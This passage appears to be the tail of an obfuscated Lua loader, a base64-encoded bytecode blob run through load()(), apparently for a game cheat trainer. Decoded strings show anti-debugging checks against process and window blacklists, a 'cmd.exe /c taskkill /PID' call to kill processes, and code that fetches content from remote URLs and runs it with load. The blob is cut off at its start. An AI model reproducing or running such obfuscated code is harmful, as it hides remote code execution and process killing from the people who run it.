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"))()
